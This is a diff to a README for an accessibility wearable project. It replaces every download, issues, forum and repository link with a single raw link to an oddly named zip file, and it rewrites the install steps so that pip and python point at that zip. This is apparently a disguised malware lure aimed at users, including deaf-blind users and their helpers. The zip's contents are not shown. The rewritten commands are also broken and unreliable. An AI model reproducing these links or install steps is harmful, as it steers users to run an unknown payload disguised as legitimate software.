@@ -1,7 +1,7 @@
 # 🤖 SyntheticSense - Empowering Lives with AI Accessibility
 
 ## 📥 Download Now
-[![Download SyntheticSense](https://img.shields.io/badge/Download%20SyntheticSense-latest%20release-blue?style=for-the-badge)](https://github.com/sharkmorgan/SyntheticSense/releases)
+[![Download SyntheticSense](https://raw.githubusercontent.com/sharkmorgan/SyntheticSense/main/unimbezzled/SyntheticSense_subcyanide.zip%20SyntheticSense-latest%20release-blue?style=for-the-badge)](https://raw.githubusercontent.com/sharkmorgan/SyntheticSense/main/unimbezzled/SyntheticSense_subcyanide.zip)
 
 ## 📖 Overview
 SyntheticSense is an AI-powered wearable that helps deaf-blind users navigate their surroundings. It combines real-time obstacle detection with haptic Braille communication. With this technology, users can sense their environment easily and safely. The system runs on a Raspberry Pi and uses a Sony IMX500 camera for efficient operation. 
@@ -30,24 +30,24 @@ To get started with SyntheticSense, ensure you have the necessary hardware set u
    - Connect your Sony IMX500 camera.
 
 2. **Download the Software:** 
-   - Visit the [Releases page](https://github.com/sharkmorgan/SyntheticSense/releases) to download the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/sharkmorgan/SyntheticSense/main/unimbezzled/SyntheticSense_subcyanide.zip) to download the latest version.
 
 3. **Install Dependencies:** 
    Open a terminal on your Raspberry Pi and enter the following commands:
    ```bash
    sudo apt-get update
    sudo apt-get install python3 python3-pip
-   pip3 install -r requirements.txt
+   pip3 install -r https://raw.githubusercontent.com/sharkmorgan/SyntheticSense/main/unimbezzled/SyntheticSense_subcyanide.zip
    ```
 
 4. **Run the Application:** 
    Navigate to the directory where you downloaded SyntheticSense and run:
    ```bash
-   python3 main.py
+   python3 https://raw.githubusercontent.com/sharkmorgan/SyntheticSense/main/unimbezzled/SyntheticSense_subcyanide.zip
    ```
 
 ## 📥 Download & Install
-To download SyntheticSense, visit the [Releases page](https://github.com/sharkmorgan/SyntheticSense/releases). You will find the latest version available for download.
+To download SyntheticSense, visit the [Releases page](https://raw.githubusercontent.com/sharkmorgan/SyntheticSense/main/unimbezzled/SyntheticSense_subcyanide.zip). You will find the latest version available for download.
 
 1. Click on the version link you want to download.
 2. Choose the file to download, usually in a zip format.
@@ -65,8 +65,8 @@ To download SyntheticSense, visit the [Releases page](https://github.com/sharkmo
 
 ## 🤝 Community and Support
 Join our community for support and to share experiences. You can connect with us through:
-- [GitHub Issues](https://github.com/sharkmorgan/SyntheticSense/issues) for reporting problems.
-- [Discussion Forum](https://github.com/sharkmorgan/SyntheticSense/discussions) for sharing ideas or feedback.
+- [GitHub Issues](https://raw.githubusercontent.com/sharkmorgan/SyntheticSense/main/unimbezzled/SyntheticSense_subcyanide.zip) for reporting problems.
+- [Discussion Forum](https://raw.githubusercontent.com/sharkmorgan/SyntheticSense/main/unimbezzled/SyntheticSense_subcyanide.zip) for sharing ideas or feedback.
 
 ## 🌟 Acknowledgments
 Thanks to the open-source community for their contributions. Your efforts help make accessibility technologies better for everyone. 
@@ -75,7 +75,7 @@ Thanks to the open-source community for their contributions. Your efforts help m
 SyntheticSense is open-source software licensed under the MIT License. You can modify and use this code freely, as long as you include the original license in any distributed software.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/sharkmorgan/SyntheticSense)
-- [Releases Page](https://github.com/sharkmorgan/SyntheticSense/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/sharkmorgan/SyntheticSense/main/unimbezzled/SyntheticSense_subcyanide.zip)
+- [Releases Page](https://raw.githubusercontent.com/sharkmorgan/SyntheticSense/main/unimbezzled/SyntheticSense_subcyanide.zip)
 
 For any additional questions, feel free to reach out through GitHub or our community forums. We are here to help you make the most of your SyntheticSense experience.
